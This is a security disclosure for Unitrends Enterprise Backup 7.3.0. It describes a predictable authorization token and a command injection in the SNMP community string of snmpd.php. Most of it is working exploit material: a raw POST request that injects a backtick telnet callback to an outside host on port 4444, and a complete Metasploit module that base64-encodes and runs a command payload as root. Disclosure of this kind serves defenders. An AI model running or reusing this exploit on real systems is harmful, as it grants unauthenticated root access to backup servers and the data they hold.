Unitrends Enterprise Backup 7.3.0

Multiple vulnerabilities exist within this piece of software. The largest one is likely the fact that the �auth� string used for authorization isn�t random at all. After authentication, any requests made by the browser send no cookies and only check this �auth� param, which is completely insufficient. Because of this, unauthenticated users can know what the �auth� parameter should be and make requests as the �root� user.

Unauthenticated root RCE
Because the �auth� variable is not random, an unauthenticated user can post a specially crafted request to the /recoveryconsole/bpl/snmpd.php PHP script. This script does not sanitize the SNMP community string properly which allows the user to execute remote commands as the root user. A metasploit module that exploits this has been given alongside this report. Below is the actual request. To recreate, after authentication, click on Settings -> Clients, Networking, and Notifications -> SNMP and Modify the �notpublic� entry to contain bash metacharacters.

POST /recoveryconsole/bpl/snmpd.php?type=update&sid=1&comm=notpublic`telnet+172.31.16.166+4444`&enabled=1&rx=4335379&ver=7.3.0&gcv=0 HTTP/1.1
Host: 172.31.16.99
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:26.0) Gecko/20100101 Firefox/26.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://172.31.16.99/recoveryconsole/bpria/bin/bpria.swf?vsn=7.3.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

auth=1%3A%2Fusr%2Fbp%2Flogs%2Edir%2Fgui%5Froot%2Elog%3A100

-----------------------------------

Metasploit module:

##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Unitrends Unauthenticated Root RCE",
      'Description'    => %q{
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' #discovery/metasploit module
        ],
      'References'     =>
        [
        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Unitrends Enterprise Backup 7.3.0', {}]
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'python telnet netcat perl'
            }
        },
      'DisclosureDate' => "Mar 21 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          Opt::RPORT(443),
          OptBool.new('SSL', [true, 'Use SSL', true]),
          OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/']),
        ], self.class)
  end

  def exploit

    pay = Rex::Text.encode_base64(payload.encoded)
    get = {
      'type' => 'update',
      'sid' => '1',
      'comm' => 'notpublic`echo '+pay+'|base64 --decode|sh`',
      'enabled' => '1',
      'rx' => '4335379',
      'ver' => '7.3.0',
      'gcv' => '0'
    }

    post = {
      'auth' => '1:/usr/bp/logs.dir/gui_root.log:100'
    }

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'recoveryconsole', 'bpl', 'snmpd.php'),
      'vars_get' => get,
      'vars_post' => post,
      'method' => 'POST'
    })

  end
end
